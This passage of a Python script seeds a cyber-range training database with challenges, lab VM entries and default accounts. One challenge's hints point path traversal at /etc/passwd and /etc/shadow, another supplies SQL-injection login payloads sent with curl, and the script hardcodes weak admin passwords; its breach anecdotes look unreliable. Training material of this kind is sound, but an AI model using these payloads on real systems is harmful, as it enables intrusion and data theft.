                "Path traversal vulnerabilities have led to major data breaches. In 2013, Adobe suffered a breach "
                "where attackers exploited path traversal to access source code and sensitive data of millions of users. "
                "This vulnerability type is common in file upload/download features and can lead to unauthorized access "
                "to configuration files, source code, or user data."
            ),
            'difficulty': 'Easy',
            'category': 'Web Security',
            'points': 100,
            'vm_name': 'web-server-4',
            'target_ip': '192.168.1.13',
            'flag': 'FLAG{path_traversal_234}',
            'target_url': 'http://10.0.2.7:8080/files',
            'hints': (
                "1. Look for file download/view functionality\n"
                "2. Try entering ../ to go to parent directories\n"
                "3. The application might allow reading any file on the system\n"
                "4. Sensitive files include /etc/passwd, /etc/shadow, application config files"
            )
        },
        {
            'name': 'API Authentication Bypass',
            'description': 'Bypass authentication in an API endpoint using SQL injection or other techniques.',
            'how_to_execute': 'Identify the API endpoint and exploit the authentication logic to access admin features.',
            'execution_steps': [
                'Locate the API endpoint (usually /api/login, /api/authenticate, or similar).',
                'Analyze the request: POST body, JSON format, expected parameters.',
                'Test with valid credentials first to understand the response structure.',
                'Attempt SQL injection in username/password fields: \' OR \'1\'=\'1 -- ',
                'Try variations: admin\'-- (comment out password check), \' OR 1=1 -- etc.',
                'Look for admin-specific responses: is_admin flag, special roles, or elevated privileges.',
                'If successful, the response will contain a flag or grant access to admin functionality.'
            ],
            'commands': (
                "# Test with curl (JSON payload):\n"
                "curl -X POST http://localhost:8080/api/login \\\n"
                "  -H 'Content-Type: application/json' \\\n"
                "  -d '{\"username\": \"' OR '1'='1' -- \", \"password\": \"\"}'\n"
                "\n# Form data variant:\n"
                "curl -X POST http://localhost:8080/api/login \\\n"
                "  -d 'username=' OR '1'='1&password=test'\n"
            ),
            'tools': [
                'curl / Postman (API testing)',
                'Burp Suite (interceptor & repeater)',
                'Browser Developer Tools (Network tab)'
            ],
            'real_world_use': (
                "API authentication bypass vulnerabilities have allowed attackers to access sensitive systems. "
                "In 2017, the Healthcare.gov API had vulnerabilities allowing unauthorized access to citizen data. "
                "APIs are common in modern applications and often have weaker security than web interfaces. "
                "Bypassing API authentication can lead to full system compromise or data exfiltration."
            ),
            'difficulty': 'Medium',
            'category': 'Web Security',
            'points': 150,
            'vm_name': 'api-server',
            'target_ip': '192.168.1.14',
            'flag': 'FLAG{auth_bypass_success_789}',
            'target_url': 'http://10.0.2.7:8080/auth-challenge',
            'hints': (
                "1. The API expects JSON or form-encoded data\n"
                "2. Try SQL injection payloads in the username field\n"
                "3. Look for admin indicators in the response\n"
                "4. The response contains a flag when admin privileges are obtained"
            )
        }
    ]

    # Add challenges to database
    for challenge_data in challenges:
        # Build structured execution steps: prefer explicit 'execution_steps' (list),
        # otherwise derive from the multi-line 'how_to_execute' string.
        raw_steps = challenge_data.get('execution_steps') or challenge_data.get('how_to_execute') or ''
        if isinstance(raw_steps, list):
            steps = raw_steps
        else:
            steps = [line.strip() for line in str(raw_steps).split('\n') if line.strip()]

        challenge = Challenge(
            name=challenge_data['name'],
            description=challenge_data['description'],
            how_to_execute=challenge_data.get('how_to_execute'),
            execution_steps=json.dumps(steps),
            commands=challenge_data.get('commands'),
            real_world_use=challenge_data['real_world_use'],
            difficulty=challenge_data['difficulty'],
            category=challenge_data['category'],
            points=challenge_data['points'],
            vm_name=challenge_data['vm_name'],
            target_ip=challenge_data['target_ip'],
                target_url=challenge_data.get('target_url'),
                flag=challenge_data['flag'],
            tools=str(challenge_data.get('tools', [])),
            hints=challenge_data['hints'],
            created_at=datetime.now(timezone.utc)
        )
        db.session.add(challenge)
    
    # Add VM statuses
    vms = [
        {'name': 'web-server-1', 'status': 'running', 'ip_address': '192.168.1.10'},
        {'name': 'web-server-2', 'status': 'running', 'ip_address': '192.168.1.11'},
        {'name': 'network-monitor', 'status': 'running', 'ip_address': '192.168.1.20'},
        {'name': 'cracking-station', 'status': 'running', 'ip_address': '192.168.1.30'},
        {'name': 'linux-server', 'status': 'running', 'ip_address': '192.168.1.40'},
        {'name': 'forensics-pc', 'status': 'running', 'ip_address': '192.168.1.50'},
        {'name': 'reversing-lab', 'status': 'running', 'ip_address': '192.168.1.60'},
        {'name': 'waf-server', 'status': 'running', 'ip_address': '192.168.1.70'},
        {'name': 'ssh-server', 'status': 'running', 'ip_address': '192.168.1.80'},
        {'name': 'vuln-server', 'status': 'running', 'ip_address': '192.168.1.90'}
    ]
    
    for vm_data in vms:
        vm = VMStatus(
            name=vm_data['name'],
            status=vm_data['status'],
            ip_address=vm_data['ip_address'],
            last_updated=datetime.now(timezone.utc)
        )
        db.session.add(vm)
    
    # Create admin user if not exists
    if not User.query.filter_by(username='admin').first():
        admin = User(
            username='admin',
            email='admin@cyberrange.local',
            password_hash=generate_password_hash('admin123'),
            role='admin',
            created_at=datetime.now(timezone.utc)
        )
        db.session.add(admin)
    
    # Create test user if not exists
    if not User.query.filter_by(username='user1').first():
        user = User(
            username='user1',
            email='user1@cyberrange.local',
            password_hash=generate_password_hash('password123'),
            role='user',
            created_at=datetime.now(timezone.utc)
        )
        db.session.add(user)
    
    db.session.commit()
    print("Challenges and VMs initialized successfully!")

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
        init_challenges()
